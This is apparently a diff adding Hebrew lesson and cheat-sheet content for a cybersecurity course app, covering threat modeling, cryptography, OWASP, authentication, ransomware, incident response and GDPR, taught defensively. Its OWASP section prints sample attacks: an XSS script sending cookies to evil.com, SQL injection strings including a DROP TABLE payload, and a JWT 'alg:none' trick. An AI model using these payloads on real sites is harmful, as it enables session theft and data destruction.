+  learn:[`
+<div class="did-you-know">💡 <strong>ידעת?</strong> 95% מהפרצות האבטחה מתחילות מטעות אנושית — לא מ-zero-day מתוחכם. הגורם האנושי הוא נקודת התורפה הגדולה ביותר בכל ארגון.</div>
+
+<div class="section-title">CIA Triad — שלוש עמודות האבטחה</div>
+<p class="prose">כל החלטת אבטחה נשקלת נגד שלושה ערכים: Confidentiality (סודיות), Integrity (שלמות), ו-Availability (זמינות). הם לעתים קרובות סותרים אחד את השני.</p>
+<div class="grid-3">
+<div class="card"><div class="card-icon">🔒</div><div class="card-title">Confidentiality</div><div class="card-body">רק מי שמורשה יכול לגשת לנתונים. הצפנה, גישה מבוקרת, need-to-know. דוגמה: רפואי, פיננסי.</div></div>
+<div class="card"><div class="card-icon">✅</div><div class="card-title">Integrity</div><div class="card-body">הנתונים לא שונו ללא רשות. hashing, digital signatures, audit logs. דוגמה: עדכון תוכנה חתום.</div></div>
+<div class="card"><div class="card-icon">⚡</div><div class="card-title">Availability</div><div class="card-body">המערכת זמינה למורשים כשצריך. redundancy, DDoS protection, backups. דוגמה: בית חולים 24/7.</div></div>
+</div>
+<div class="callout callout-warn"><strong>⚠️ הסתירה המובנית:</strong> אבטחה מקסימלית פוגעת בזמינות. נעילת הכל = בטוח, אבל אי אפשר לעבוד. כל מדיניות אבטחה מאזנת בין השלושה.</div>
+
+<div class="section-title">Threat Modeling — לחשוב כמו תוקף</div>
+<p class="prose">לפני שמגנים, צריך להבין מה מגנים. STRIDE הוא מודל מיקרוסופט לזיהוי איומים:</p>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>איום</th><th>משמעות</th><th>דוגמה</th><th>הגנה</th></tr></thead><tbody>
+<tr><td><strong>S</strong>poofing</td><td>התחזות</td><td>Email phishing</td><td>MFA, SPF/DKIM</td></tr>
+<tr><td><strong>T</strong>ampering</td><td>שינוי נתונים</td><td>Man-in-the-Middle</td><td>HTTPS, signing</td></tr>
+<tr><td><strong>R</strong>epudiation</td><td>הכחשת פעולה</td><td>"לא אני שלחתי"</td><td>Audit logs, timestamps</td></tr>
+<tr><td><strong>I</strong>nformation Disclosure</td><td>חשיפת מידע</td><td>Data breach</td><td>Encryption, ACL</td></tr>
+<tr><td><strong>D</strong>enial of Service</td><td>הפסקת שירות</td><td>DDoS attack</td><td>Rate limiting, CDN</td></tr>
+<tr><td><strong>E</strong>levation of Privilege</td><td>הסלמת הרשאות</td><td>sudo exploit</td><td>Least privilege</td></tr>
+</tbody></table></div>
+
+<div class="section-title">Defense in Depth — הגנה בשכבות</div>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">🌐</div><div class="flow-step-label">Perimeter<br>Firewall, WAF</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔗</div><div class="flow-step-label">Network<br>Segmentation</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🖥️</div><div class="flow-step-label">Endpoint<br>AV, EDR</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">💾</div><div class="flow-step-label">Data<br>Encryption</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">👤</div><div class="flow-step-label">Identity<br>MFA, RBAC</div></div>
+</div>
+<div class="callout callout-info"><strong>💡 הרעיון:</strong> תוקף שעובר שכבה אחת עדיין נתקל בחמש נוספות. אין הגנה מושלמת — אבל כל שכבה מוסיפה זמן, עלות ורעש לתוקף.</div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: Colonial Pipeline — מאי 2021</div>
+  <div class="incident-body">
+    Colonial Pipeline — צינור הדלק הגדול בארה"ב — הושבת על ידי ransomware. הגישה הראשונית: VPN account ישן עם סיסמה שדלפה, ללא MFA. 5.5 מיליון דולר כופר שולמו.<br><br>
+    <strong>הלקחים:</strong> (1) MFA על כל VPN — חובה. (2) accounts ישנים שלא בשימוש — מחיקה. (3) network segmentation — ה-IT וה-OT (מערכות תפעוליות) לא אמורים לתקשר ישירות. ארגון קריטי כמו צינור דלק לא יכול להרשות single point of failure.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת שולחת WhatsApp, הוא מוצפן עם פרוטוקול Signal. WhatsApp עצמה לא יכולה לקרוא את ההודעות שלך. זה End-to-End Encryption — אפילו לחברה שבנתה את האפליקציה אין גישה לתוכן.</div>
+
+<div class="section-title">Symmetric Encryption — מפתח אחד</div>
+<p class="prose">AES (Advanced Encryption Standard) הוא הstandard לסימטרי. אותו מפתח מצפין ומפענח. מהיר ויעיל, אבל דורש שיתוף מפתח מראש.</p>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🔑</div><div class="card-title">AES-256</div><div class="card-body">128-bit block, 256-bit key. משמש בTLS, BitLocker, ZIP מוצפן. <strong>מהיר מאוד בחומרה.</strong> NSA מאשר לCLASSIFIED TOP SECRET.</div></div>
+<div class="card"><div class="card-icon">⚡</div><div class="card-title">Modes of Operation</div><div class="card-body"><strong>ECB</strong> — אינו בטוח, patterns גלויים.<br><strong>CBC</strong> — טוב, אבל לא מקבילי.<br><strong>GCM</strong> — המומלץ: מהיר + Authenticated Encryption.</div></div>
+</div>
+
+<div class="section-title">Asymmetric Encryption — מפתח ציבורי/פרטי</div>
+<p class="prose">RSA ו-ECC: כל אחד מחזיק public key (ניתן לשיתוף חופשי) ו-private key (סודי לחלוטין). מה שמוצפן עם public key — רק ה-private key מפענח. <strong>הבסיס של HTTPS, SSH, ו-Code Signing.</strong></p>
+<pre class="code-block"><code><span class="comment"># TLS Handshake — איך HTTPS עובד</span>
+1. Client → Server: "Hello" + supported cipher suites
+2. Server → Client: Certificate (contains public key)
+3. Client: <span class="key">verifies certificate</span> against trusted CA
+4. Client → Server: <span class="val">session key encrypted with server's public key</span>
+5. Server: decrypts session key with <span class="key">private key</span>
+6. Both: now use fast <span class="val">AES symmetric encryption</span>
+
+<span class="comment"># RSA vs ECC comparison</span>
+RSA-2048  = 2048 bit key, older, slower
+ECC-256   = 256 bit key, same security as RSA-3072
+Ed25519   = modern ECC, used in SSH, Signal</code></pre>
+
+<div class="section-title">Hashing — חתימה חד-כיוונית</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>אלגוריתם</th><th>Output</th><th>מצב</th><th>שימוש</th></tr></thead><tbody>
+<tr><td>MD5</td><td>128 bit</td><td><span class="threat-badge badge-critical">שבור</span></td><td>לגמרי לא לאבטחה</td></tr>
+<tr><td>SHA-1</td><td>160 bit</td><td><span class="threat-badge badge-critical">שבור</span></td><td>deprecated</td></tr>
+<tr><td>SHA-256</td><td>256 bit</td><td><span class="threat-badge badge-low">בטוח</span></td><td>Git, certificates</td></tr>
+<tr><td>SHA-3</td><td>256-512 bit</td><td><span class="threat-badge badge-low">בטוח</span></td><td>NIST standard</td></tr>
+<tr><td>bcrypt</td><td>184 bit</td><td><span class="threat-badge badge-low">בטוח</span></td><td>סיסמאות בלבד</td></tr>
+<tr><td>Argon2</td><td>variable</td><td><span class="threat-badge badge-low">מומלץ</span></td><td>סיסמאות — הכי טוב</td></tr>
+</tbody></table></div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: SHA-1 Collision — Google SHAttered (2017)</div>
+  <div class="incident-body">
+    ב-2017, גוגל הדגימה ש-SHA-1 שבור לחלוטין: הם יצרו שני קבצי PDF שונים עם אותו SHA-1 hash. תוקף יכול לייצר מסמך זדוני עם hash זהה למסמך לגיטימי.<br><br>
+    <strong>עלות ה-collision:</strong> 6,500 שנות מחשוב בCPU, 110 שנות GPU — אפשרי לגורמים ממומנים. Chrome, Firefox ו-CA/Browser Forum אסרו SHA-1 לחלוטין.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת מתחברת ל-WiFi בבית קפה, כל ה-traffic שלך עובר דרך הנתב שם. ללא HTTPS ו-VPN, בעל בית הקפה (או כל מי שמחובר לאותה רשת) יכול לראות את כל מה שאת עושה.</div>
+
+<div class="section-title">Firewalls — שומרי הרשת</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🔥</div><div class="card-title">Stateless Firewall</div><div class="card-body">בודק כל packet בנפרד לפי IP/Port. מהיר, אבל לא מבין context. לא מזהה: port scanning, IP spoofing, fragmented packets.</div></div>
+<div class="card"><div class="card-icon">🧠</div><div class="card-title">Stateful Firewall</div><div class="card-body">עוקב אחר connections. יודע ש-ACK packet בלי SYN מוקדם = חשוד. הרוב המכריע של firewalls מודרניים.</div></div>
+<div class="card"><div class="card-icon">🔍</div><div class="card-title">NGFW / WAF</div><div class="card-body">Next-Gen Firewall: Deep Packet Inspection, Application Awareness, IPS מובנה, SSL Inspection. WAF מגן ספציפית על web apps.</div></div>
+<div class="card"><div class="card-icon">🕵️</div><div class="card-title">IDS vs IPS</div><div class="card-body"><strong>IDS</strong> = Intrusion Detection — מזהה ומתריע.<br><strong>IPS</strong> = Intrusion Prevention — מזהה <em>וחוסם</em>. IPS inline = יכול לחסום legitimate traffic.</div></div>
+</div>
+
+<div class="section-title">Zero Trust — "לעולם אל תסמוך, תמיד תאמת"</div>
+<p class="prose">המודל הישן: "כל מה שבתוך הרשת — בטוח". Zero Trust: <strong>לא סומכים על אף אחד, בתוך הרשת או מחוצה לה</strong>, ללא authentication וauthorization מפורשים.</p>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">👤</div><div class="flow-step-label">Verify Identity<br>MFA תמיד</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📱</div><div class="flow-step-label">Check Device<br>Health, MDM</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📍</div><div class="flow-step-label">Verify Context<br>Location, Time</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔐</div><div class="flow-step-label">Least Privilege<br>מינימום הרשאות</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📊</div><div class="flow-step-label">Monitor All<br>Continuous</div></div>
+</div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: SolarWinds Supply Chain Attack — 2020</div>
+  <div class="incident-body">
+    האקרים רוסיים (APT29/Cozy Bear) חדרו לSolarWinds ושתלו backdoor ב-Orion software update. 18,000 ארגונים התקינו את ה-update הנגוע, כולל Microsoft, Intel, CISA ו-Treasury Department.<br><br>
+    <strong>מדוע Zero Trust היה מגן:</strong> ה-backdoor יצר lateral movement בתוך הרשת — ועם Zero Trust ו-micro-segmentation, תנועה כזו בין systems היתה נחסמת ומזוהה מיידית. Trust המרומז = הסיבה לנזק הקטסטרופלי.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> OWASP Top 10 עולה כ-3 מיליארד דולר בנזקים שנתיים. SQL Injection — שהתגלה ב-1998 — עדיין נמצא ב-Top 10. הפרצה הכי ישנה בספר עדיין רלוונטית ב-2024.</div>
+
+<div class="section-title">OWASP Top 10 — 2021</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>#</th><th>קטגוריה</th><th>חומרה</th><th>דוגמה</th></tr></thead><tbody>
+<tr><td>A01</td><td>Broken Access Control</td><td><span class="threat-badge badge-critical">קריטי</span></td><td>גישה לפרופיל של משתמש אחר</td></tr>
+<tr><td>A02</td><td>Cryptographic Failures</td><td><span class="threat-badge badge-critical">קריטי</span></td><td>HTTP במקום HTTPS, MD5 לסיסמאות</td></tr>
+<tr><td>A03</td><td>Injection (SQL, XSS)</td><td><span class="threat-badge badge-critical">קריטי</span></td><td>SELECT * FROM users WHERE id='$id'</td></tr>
+<tr><td>A04</td><td>Insecure Design</td><td><span class="threat-badge badge-high">גבוה</span></td><td>אין rate limiting על login</td></tr>
+<tr><td>A05</td><td>Security Misconfiguration</td><td><span class="threat-badge badge-high">גבוה</span></td><td>Admin panel פתוח לinternet</td></tr>
+<tr><td>A07</td><td>Auth & Session Failures</td><td><span class="threat-badge badge-high">גבוה</span></td><td>סיסמה חלשה, session לא פג תוקף</td></tr>
+<tr><td>A09</td><td>Logging Failures</td><td><span class="threat-badge badge-medium">בינוני</span></td><td>אין log על login failures</td></tr>
+</tbody></table></div>
+
+<div class="section-title">SQL Injection — הפרצה הקלאסית</div>
+<pre class="code-block"><code><span class="comment"># Vulnerable code (PHP)</span>
+$query = "SELECT * FROM users WHERE user='" . $_GET['user'] . "'";
+
+<span class="comment"># תוקף שולח: ' OR '1'='1</span>
+<span class="comment"># Query הופך ל:</span>
+SELECT * FROM users WHERE user='' <span class="key">OR '1'='1'</span>
+<span class="comment"># תוצאה: כל המשתמשים מוחזרים!</span>
+
+<span class="comment"># תוקף מתקדם — מחיקת DB:</span>
+'; DROP TABLE users; --
+
+<span class="comment"># ✅ הפתרון: Parameterized Queries</span>
+$stmt = $pdo->prepare("SELECT * FROM users WHERE user = <span class="val">?</span>");
+$stmt->execute([$_GET['user']]);
+<span class="comment"># Input מטופל כdata, לא כקוד SQL</span></code></pre>
+
+<div class="section-title">XSS — Stored, Reflected, DOM</div>
+<pre class="code-block"><code><span class="comment"># Stored XSS — מאוחסן בDB, מבוצע על כל visitor</span>
+<span class="comment"># משתמש מזדוני מפרסם תגובה:</span>
+<span class="key">&lt;script&gt;</span>document.location='https://evil.com/steal?c='+document.cookie<span class="key">&lt;/script&gt;</span>
+
+<span class="comment"># Reflected XSS — ב-URL</span>
+https://site.com/search?q=<span class="key">&lt;script&gt;</span>alert(1)<span class="key">&lt;/script&gt;</span>
+
+<span class="comment"># ✅ הגנות</span>
+1. Content-Security-Policy: script-src 'self'  <span class="comment"># blocks inline scripts</span>
+2. Output encoding: &amp;lt;script&amp;gt;             <span class="comment"># HTML encode</span>
+3. HTTPOnly cookies                            <span class="comment"># JS לא יכול לגשת</span>
+4. SameSite=Strict cookies                    <span class="comment"># מגן מCSRF</span></code></pre>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: British Airways — 2018, 500K כרטיסי אשראי</div>
+  <div class="incident-body">
+    קבוצת Magecart שתלה script זדוני בדף התשלום של British Airways שסינן נתוני תשלום לשרת חיצוני. הפרצה: שינוי של 22 שורות JavaScript. הסקריפט רץ 2 שבועות לפני שזוהה.<br><br>
+    <strong>מה היה מונע:</strong> Content-Security-Policy (CSP) שחוסם scripts ממקורות לא מורשים. Subresource Integrity (SRI) לوالتحقق של third-party scripts. British Airways קיבלה קנס GDPR של £183M.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> כשאת נכנסת לSpotify עם חשבון Google, Google לא אומרת לSpotify מה הסיסמה שלך. היא שולחת "voucher" מוצפן שאומר "אני מאמתת שמשתמשת זו לגיטימית". זה OAuth 2.0 — הפרוטוקול שמריץ את רוב ה"Login with Google/Facebook" בעולם.</div>
+
+<div class="section-title">Authentication vs Authorization</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🪪</div><div class="card-title">Authentication — מי אתה?</div><div class="card-body">אימות זהות: סיסמה, biometrics, certificate. <strong>Something you know, have, are.</strong></div></div>
+<div class="card"><div class="card-icon">🔐</div><div class="card-title">Authorization — מה מותר לך?</div><div class="card-body">הרשאות לאחר זיהוי. RBAC, ABAC, ACL. "Admin רואה הכל, User רואה רק שלו."</div></div>
+</div>
+
+<div class="section-title">MFA — Multi-Factor Authentication</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>Factor</th><th>דוגמה</th><th>חוזק</th><th>חולשה</th></tr></thead><tbody>
+<tr><td>SMS OTP</td><td>קוד ב-SMS</td><td><span class="threat-badge badge-medium">בינוני</span></td><td>SIM swapping, SS7 attack</td></tr>
+<tr><td>TOTP App</td><td>Google Authenticator</td><td><span class="threat-badge badge-low">טוב</span></td><td>Phishing real-time</td></tr>
+<tr><td>Hardware Key</td><td>YubiKey, FIDO2</td><td><span class="threat-badge badge-low">מצוין</span></td><td>עלות, אובדן פיזי</td></tr>
+<tr><td>Passkey</td><td>Face ID, biometric</td><td><span class="threat-badge badge-low">מצוין</span></td><td>חדש, תמיכה חלקית</td></tr>
+</tbody></table></div>
+
+<div class="section-title">JWT — JSON Web Token</div>
+<pre class="code-block"><code><span class="comment"># JWT מורכב מ-3 חלקים, מופרדים ב-.</span>
+eyJhbGciOiJIUzI1NiJ9<span class="key">.</span>eyJzdWIiOiI0MiIsInJvbGUiOiJhZG1pbiJ9<span class="key">.</span>signature
+
+<span class="comment"># Header (base64): {"alg": "HS256"}</span>
+<span class="comment"># Payload (base64, NOT encrypted!):</span>
+{
+  "sub": "42",          <span class="comment">// user ID</span>
+  "role": "<span class="key">admin</span>",     <span class="comment">// ⚠️ ניתן לקריאה!</span>
+  "exp": 1716239022     <span class="comment">// expiry</span>
+}
+<span class="comment"># Signature: HMAC(header + "." + payload, secret)</span>
+
+<span class="comment"># הפגיעות הנפוצה: "alg: none" attack</span>
+<span class="comment"># תוקף משנה alg לnone ומסיר signature</span>
+<span class="comment"># ✅ תמיד לאמת alg ולא לקבל alg:none!</span></code></pre>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: Okta Breach — 2023</div>
+  <div class="incident-body">
+    ספק הזהות Okta — שמשמש לSSO אצל אלפי חברות — חווה פרצה שגרמה לנתוני לקוחות כולל BeyondTrust, Cloudflare ו-1Password להיחשף. הגישה: support ticket system שקיבל גישה ל-production systems.<br><br>
+    <strong>הלקח:</strong> Identity providers הם "keys to the kingdom" — פשרה שלהם פירושה גישה לכל הלקוחות. Zero Trust, מינימום הרשאות לsupport systems, וmulti-party approval לפעולות רגישות הם הכרחיים.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> 91% מהתקיפות הסייבר מתחילות ב-phishing email. האנטי-וירוס הכי טוב בעולם לא מגן על עובד שנלחץ על קישור ב-email שנראה ממנהל שלו.</div>
+
+<div class="section-title">Phishing — ממייל לפרצה</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">🎣</div><div class="card-title">Phishing רגיל</div><div class="card-body">מיילים המוניים בכמות גדולה. "הבנק שלך נפרץ, לחץ כאן." נמוך מאמץ, נמוך אחוז הצלחה.</div></div>
+<div class="card"><div class="card-icon">🎯</div><div class="card-title">Spear Phishing</div><div class="card-body">ממוקד לאדם ספציפי. שם, תפקיד, פרטים אישיים. "שלום אריאל, ראיתי שאתה במחלקת R&D..." אחוז הצלחה גבוה בהרבה.</div></div>
+<div class="card"><div class="card-icon">🐳</div><div class="card-title">Whaling</div><div class="card-body">Spear phishing נגד C-level executives. CEO Fraud: "אני ה-CFO, צריך העברה דחופה של $2M."</div></div>
+<div class="card"><div class="card-icon">📞</div><div class="card-title">Vishing / Smishing</div><div class="card-body">Voice phishing (טלפון) ו-SMS phishing. "אני מהIT, צריך את הסיסמה שלך לאיפוס דחוף."</div></div>
+</div>
+
+<div class="section-title">Ransomware — כיצד זה עובד</div>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">📧</div><div class="flow-step-label">Initial Access<br>Phishing/RDP</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🦠</div><div class="flow-step-label">Execution<br>Payload runs</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔄</div><div class="flow-step-label">Persistence<br>Registry/Startup</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🕵️</div><div class="flow-step-label">Lateral Movement<br>מתפשט ברשת</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">Encryption<br>AES קבצים</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">💰</div><div class="flow-step-label">Ransom Note<br>Bitcoin</div></div>
+</div>
+
+<div class="callout callout-danger"><strong>🚨 Double Extortion:</strong> קבוצות כמו LockBit ו-REvil לא רק מצפינות — הן גם גונבות את הנתונים ומאיימות לפרסם אם לא ישלמו. גיבוי טוב מגן מההצפנה, אבל לא מהפרסום.</div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: WannaCry — מאי 2017, 200,000 מחשבים ב-150 מדינות</div>
+  <div class="incident-body">
+    WannaCry השתמש ב-EternalBlue — exploit של NSA שדלף — שניצל פגיעות ב-SMBv1 של Windows. המתקפה פגעה ב-NHS (בריטניה): אלפי ניתוחים בוטלו, נזק של £92M. Renault עצרה פס ייצור. FedEx הפסידה $300M.<br><br>
+    <strong>הפגיעות:</strong> patch שוחרר על ידי מיקרוסופט 2 חודשים לפני המתקפה. ארגונים שלא עדכנו — נפגעו. <strong>patch management = הגנה הכי חשובה.</strong>
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> MTTR (Mean Time To Respond) הממוצע לפרצת אבטחה הוא 207 ימים לזיהוי ועוד 73 ימים להכלה — 280 ימים בסה"כ. תוקף יכול לישב ב-network שלך 9 חודשים לפני שמגלים אותו.</div>
+
+<div class="section-title">NIST Incident Response Framework</div>
+<div class="flow-row">
+  <div class="flow-step"><div class="flow-step-icon">🔍</div><div class="flow-step-label">Preparation<br>תכנון מראש</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🚨</div><div class="flow-step-label">Detection<br>זיהוי האירוע</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔒</div><div class="flow-step-label">Containment<br>בידוד מיידי</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🧹</div><div class="flow-step-label">Eradication<br>ניקוי מלא</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">🔄</div><div class="flow-step-label">Recovery<br>חזרה לפעילות</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-step-icon">📝</div><div class="flow-step-label">Lessons Learned<br>מה ניתן ללמוד</div></div>
+</div>
+
+<div class="section-title">Digital Forensics — שימור ראיות</div>
+<div class="callout callout-warn"><strong>⚠️ Order of Volatility — סדר שימור ראיות:</strong> CPU registers → Network connections → Running processes → Memory (RAM) → Disk → Logs. תמיד לשמור volatile data קודם — היא נעלמת בreboot.</div>
+<pre class="code-block"><code><span class="comment"># Linux forensics — first response commands</span>
+date                          <span class="comment"># timestamp of investigation</span>
+w && who                      <span class="comment"># who is logged in</span>
+ps auxf                       <span class="comment"># all running processes</span>
+netstat -tulnap               <span class="comment"># open connections</span>
+lsof -i                       <span class="comment"># open network files</span>
+cat /proc/[pid]/maps          <span class="comment"># process memory maps</span>
+dd if=/dev/mem of=memory.dump <span class="comment"># RAM dump (before reboot!)</span>
+find / -mtime -1 -type f 2>/dev/null <span class="comment"># files changed in 24h</span>
+last && lastb                 <span class="comment"># login history + failures</span></code></pre>
+
+<div class="section-title">IOCs — Indicators of Compromise</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">📍</div><div class="card-title">Network IOCs</div><div class="card-body">IP addresses, domain names, URLs, unusual outbound connections, beaconing patterns (תקשורת קבועה בintervels קבועים).</div></div>
+<div class="card"><div class="card-icon">💾</div><div class="card-title">Host IOCs</div><div class="card-body">File hashes (MD5/SHA), registry keys, scheduled tasks חדשים, processes חריגים, files בlocations לא רגילים.</div></div>
+</div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: Equifax — 2017, 147M אמריקאים</div>
+  <div class="incident-body">
+    Equifax גילתה את הפרצה ב-29 ביולי 2017, אבל התוקפים היו בתוך הרשת מה-13 במאי — 76 ימים של lateral movement, גניבת נתונים בהדרגה. הסיבה שלא זוהה: SSL inspection לא הופעל, אז traffic מוצפן עם certificate פג תוקף לא נבדק.<br><br>
+    <strong>הלקחים לIR:</strong> (1) Monitoring של outbound traffic — חריגות בנפח. (2) SSL inspection פעיל. (3) Network segmentation — DB של 147M אנשים לא אמור להיות נגיש מרשת ה-web tier.
+  </div>
+</div>`,
+
+`<div class="did-you-know">💡 <strong>ידעת?</strong> GDPR הטיל קנסות של מעל 4 מיליארד אירו מאז 2018. הקנס הגדול ביותר: Meta — 1.2 מיליארד אירו ב-2023. אבטחת מידע כבר לא רק עניין טכני — היא exposure עסקי ישיר.</div>
+
+<div class="section-title">GDPR — מה שכל ארגון חייב לדעת</div>
+<div class="grid-2">
+<div class="card"><div class="card-icon">⏱️</div><div class="card-title">72 שעות</div><div class="card-body">חובת דיווח על breach לרגולטור תוך 72 שעות מהגילוי. אם נפגעו נושאי נתונים — גם להם.</div></div>
+<div class="card"><div class="card-icon">🗑️</div><div class="card-title">Right to Erasure</div><div class="card-body">כל אדם יכול לבקש מחיקת כל נתוניו. "הזכות להישכח." אתגר טכני: backups, logs, replicas.</div></div>
+<div class="card"><div class="card-icon">📋</div><div class="card-title">DPIA</div><div class="card-body">Data Protection Impact Assessment — הערכת סיכונים לפני עיבוד נתונים בסיכון גבוה. כמו facial recognition, health data.</div></div>
+<div class="card"><div class="card-icon">💰</div><div class="card-title">קנסות</div><div class="card-body">עד 4% מהמחזור הגלובלי השנתי, או 20M€ — הגבוה מביניהם. לא פחות מקנס תפעולי רגיל.</div></div>
+</div>
+
+<div class="section-title">Risk Management — NIST Framework</div>
+<p class="prose">Risk = Likelihood × Impact. לא כל סיכון דורש טיפול מיידי. ארבע אסטרטגיות:</p>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>אסטרטגיה</th><th>משמעות</th><th>מתי?</th><th>דוגמה</th></tr></thead><tbody>
+<tr><td><strong>Mitigate</strong></td><td>הפחתת הסיכון</td><td>כשהעלות שווה</td><td>הטמעת MFA</td></tr>
+<tr><td><strong>Transfer</strong></td><td>העברת הסיכון</td><td>ביטוח סייבר</td><td>Cyber Insurance</td></tr>
+<tr><td><strong>Accept</strong></td><td>קבלת הסיכון</td><td>עלות הגנה > נזק</td><td>Legacy system קטן</td></tr>
+<tr><td><strong>Avoid</strong></td><td>הימנעות מהסיכון</td><td>הסיכון גבוה מדי</td><td>לא לאחסן CC numbers</td></tr>
+</tbody></table></div>
+
+<div class="section-title">ISO 27001 vs SOC 2 vs PCI DSS</div>
+<div class="table-wrap"><table class="data-table"><thead><tr><th>תקן</th><th>מי צריך?</th><th>מוקד</th><th>אחוז חברות</th></tr></thead><tbody>
+<tr><td>ISO 27001</td><td>כל ארגון, בינ"ל</td><td>ISMS — ניהול מערכתי</td><td>בינלאומי נפוץ</td></tr>
+<tr><td>SOC 2 Type II</td><td>SaaS, Tech</td><td>Security, Availability, Privacy</td><td>דרישת לקוח ב-US</td></tr>
+<tr><td>PCI DSS</td><td>כל מי שמעבד CC</td><td>כרטיסי אשראי</td><td>חובה עם קנסות</td></tr>
+<tr><td>HIPAA</td><td>Healthcare ב-US</td><td>Health data</td><td>נדרש בארה"ב</td></tr>
+</tbody></table></div>
+
+<div class="incident-box">
+  <div class="incident-title">🔥 אירוע אמיתי: Meta — 2023, קנס GDPR של €1.2 מיליארד</div>
+  <div class="incident-body">
+    הקנס הגדול ביותר בהיסטוריית GDPR: הרגולטור האירי קנס את Meta על העברת נתוני אירופאים לארה"ב ללא מנגנוני הגנה מספקים. Meta ממשיכה לערער.<br><br>
+    <strong>ההשלכה לכל ארגון:</strong> Data transfers מהEU לארה"ב דורשים Standard Contractual Clauses (SCCs) או Adequacy Decision. לא "המידע בענן של אמריקאי" — זה לא מספיק. Privacy by Design ו-Data Minimization הם לא אופציונלים.
+  </div>
+</div>`
+  ],
+  cheat:[
+`<div class="callout callout-success"><strong>📋 סיכום — מבוא לאבטחה</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">CIA Triad</div>
+<div class="cheat-item"><span class="cheat-key">Confidentiality</span><span class="cheat-val">סודיות — ACL, הצפנה</span></div>
+<div class="cheat-item"><span class="cheat-key">Integrity</span><span class="cheat-val">שלמות — hash, signing</span></div>
+<div class="cheat-item"><span class="cheat-key">Availability</span><span class="cheat-val">זמינות — redundancy</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">STRIDE</div>
+<div class="cheat-item"><span class="cheat-key">Spoofing</span><span class="cheat-val">התחזות</span></div>
+<div class="cheat-item"><span class="cheat-key">Tampering</span><span class="cheat-val">שינוי נתונים</span></div>
+<div class="cheat-item"><span class="cheat-key">Repudiation</span><span class="cheat-val">הכחשת פעולה</span></div>
+<div class="cheat-item"><span class="cheat-key">Information Disclosure</span><span class="cheat-val">חשיפת מידע</span></div>
+<div class="cheat-item"><span class="cheat-key">DoS</span><span class="cheat-val">הפסקת שירות</span></div>
+<div class="cheat-item"><span class="cheat-key">Elevation of Privilege</span><span class="cheat-val">הסלמת הרשאות</span></div>
+</div>
+</div>`,
+`<div class="callout callout-success"><strong>📋 סיכום — קריפטוגרפיה</strong></div>
+<div class="cheat-grid">
+<div class="cheat-card"><div class="cheat-card-title">Symmetric</div>
+<div class="cheat-item"><span class="cheat-key">AES-256-GCM</span><span class="cheat-val">מומלץ לנתונים</span></div>
+<div class="cheat-item"><span class="cheat-key">מפתח אחד</span><span class="cheat-val">הצפנה+פענוח</span></div>
+<div class="cheat-item"><span class="cheat-key">מהיר מאוד</span><span class="cheat-val">חומרה + תוכנה</span></div>
+</div>
+<div class="cheat-card"><div class="cheat-card-title">Hashing</div>
+<div class="cheat-item"><span class="cheat-key">SHA-256/3</span><span class="cheat-val">קבצים, certificates</span></div>
+<div class="cheat-item"><span class="cheat-key">bcrypt/Argon2</span><span class="cheat-val">סיסמאות בלבד</span></div>
